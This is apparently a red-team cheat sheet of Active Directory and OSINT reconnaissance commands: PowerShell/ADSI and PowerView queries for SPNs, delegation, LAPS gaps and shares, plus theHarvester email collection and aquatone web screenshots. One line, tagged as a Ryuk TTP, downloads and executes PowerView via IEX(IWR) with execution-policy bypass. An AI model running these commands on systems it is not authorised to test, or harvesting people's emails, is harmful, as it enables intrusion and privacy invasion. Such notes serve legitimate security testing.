# Discovery



### Retrieve Group Membership for User

```powershell
Get-ADPrincipalGroupMembership "USERNAME" | Select name
```

### AD Enumeration via ADSI `DirectorySearcher`

#### Computer/User Objects

```powershell
([adsisearcher]'(&(objectCategory=Computer))').FindAll();
([adsisearcher]'(&(objectCategory=User))').FindAll();
```

#### SPNs

```powershell
([adsisearcher]"(&(&(servicePrincipalName=*) (UserAccountControl:1.2.840.113556.1.4.803:=512)) (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))").FindAll();
```

Or

```powershell
$s = New-Object DirectoryServices.DirectorySearcher([ADSI]"");
$s.PageSize = 2000; 
$s.Filter = "(servicePrincipalName=*)";
$s.FindAll();
```

### Unconstrained delegation

```powershell
([adsisearcher]"(&(&(objectCategory=person)(objectClass=user)) (!userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll();
```

### Local Administrator Password Solution (LAPS)

Retrieve computers that are not configured with LAPS

```powershell
Get-ADComputer -Credential $cred -Server BURMAT.LOCAL -Filter {ms-Mcs-AdmPwd -notlike "*"} | Export-CSV -Path C:\temp\no_laps.csv;
```

### LDAP with PowerShell

#### Domain Users and Computers

```powershell
$users = ([adsisearcher]"(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))").FindAll();
foreach ($u in $users) { 
    $u.Properties.samaccountname | Out-File C:\users-and-computers.txt -Append;
}
```

Extracting computers from the output:

* `Get-Content  C:\users-and-computers.txt  | Select-String "$" | out-file C:\computers.txt -append`

Extracting domain users from the output:

* `Get-Content  C:\users-and-computers.txt  | Select-String "$" -NotMatch | out-file C:\users.txt -append`

## PowerSploit

### Discovering Domain Controllers

```powershell
Get-DomainComputer -Credential $cred -Server dc01.burmat.local -Domain burmat.local -SearchBase "LDAP://OU=Domain Controllers,DC=BURMAT,DC=LOCAL" | Export-Csv -Path C:\domain_controllers.csv
```

### Domain Computers

```powershell
Get-ADComputer -Filter * -Server dc01.burmat.local | export-csv -Path C:\temp\domain_computers.csv
```

### Unconstrained Delegation (Other than DCs)

```powershell
Get-DomainComputer -Credential $cred -Server dc01.burmat.local -Domain burmat.local -Unconstrained | Export-Csv -Path C:\unconstrained_deleg_machines.csv
```

### Allowed to Delegate

```powershell
Get-DomainUser -Credential $cred -Server dc01.burmat.local -Domain burmat.local -AllowDelegation -AdminCount | Export-Csv -Path C:\allowed_to_deleg.csv
```

### Gather User Descriptions

```powershell
Get-DomainUser -Credential $cred -Server dc01.burmat.local -Domain burmat.local -Properties SAMAccountName,Description | Select-Object SAMAccountName,Description | Export-CSV -Path C:\user_descriptions.csv
```

### Enumerate Domain Network Shares

```powershell
Find-DomainShare -ComputerName fs01.domain.local -ComputerDomain domain.local -CheckShareAccess
```

Authenticated with custom credentials:

```powershell
$secpassword = ConvertTo-SecureString 'Password123$' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $secpassword)
Find-DomainShare -Domain dir.svc.accenture.com -Credential $cred
```

Looping a list of hostnames:

```powershell
foreach ($h in $smb_hosts) {  find-domainshare -Credential $cred -computername "$h" -computerdomain burmat.local -server dc1.burmat.local -CheckShareAccess; }
```

#### Specific TTP for Ryuk

```powershell
powershell.exe -exec bypass -Command "&{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-NetSubnet; Get-NetComputer}"
```

## theHarvester

An open-source intelligence (OSINT) gathering tool, that will tap into many difference APIs to gather data for you. GitHub: [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)

Installation is a PITA. Put your API keys into the api-keys.yaml file in the root of the directory

#### Email Address Gathering:

Getting a list of email addresses from i[ntelx.io:](http://intelx.io/)

```sh
python3 theHarvester.py -d contoso.com -b intelx >> intelx-contoso.com.txt
```

If you are doing multiple domains, you can use the following bash one-liner, where `domains.txt` is a list of domain names to search:

```bash
while read d; do python3 theHarvester.py -b intelx -d $d -f "th-$d"; sleep 1; done < domains.txt
```

Clean up the output to just be emails with the following, if you have problems:

```sh
grep -i -o '[A-Z0-9._%+-]\\+@[A-Z0-9.-]\\+\\.[A-Z]\\{2,4\\}' intelx-contoso.com.txt
```

<details>

<summary>Sample theHarvers API Configuration File</summary>

This goes in `~/.theHarvester/api-keys.yaml` for Kali

```
apikeys:
  bevigil:
    key:

  binaryedge:
    key:

  bing:
    key:

  bufferoverun:
    key:

  censys:
    id:
    secret:

  criminalip:
    key:

  fullhunt:
    key:

  github:
    key:

  hunter:
    key:

  hunterhow:
    key:

  intelx:
    key:

  netlas:
    key:

  onyphe:
    key:

  pentestTools:
    key:

  projectDiscovery:
    key:

  rocketreach:
    key:

  securityTrails:
    key:

  shodan:
    key:

  tomba:
    key:
    secret:

  virustotal:
    key:

  zoomeye:
    key:
```

</details>

## Web Enumeration

### aquatone

Found here: [GitHub - michenriksen/aquatone: A Tool for Domain Flyovers](https://github.com/michenriksen/aquatone)

#### **Basic Usage**

```bash
cat hosts.txt | aquatone -ports small -out scans/aquatone -threads 10 -screenshot-timeout 50000 -chrome-path /usr/bin/chromium
```

#### **Nmap Scan Results**

```bash
cat nmap/tcp_web.xml | aquatone -nmap -screenshot-timeout 50000 -out scans/aquatone -threads 10 -chrome-path /usr/bin/chromium
```

#### Using a Proxy via Burp

(Assuming Burp is listening to localhost:8080):

* `-proxy http://127.0.0.1:8080`

<details>

<summary>Built-In Port Lists &#x26; Aliases</summary>

* `small: 80, 443`

<!---->

* `medium: 80, 443, 8000, 8080, 8443 (same as default)`

<!---->

* `large: 80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 8000, 8001, 8008, 8080, 8083, 8443, 8834, 8888`

<!---->

* `xlarge: 80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017`

</details>

## Network&#x20;

### ARP

```
arp -a -N [interface]
```





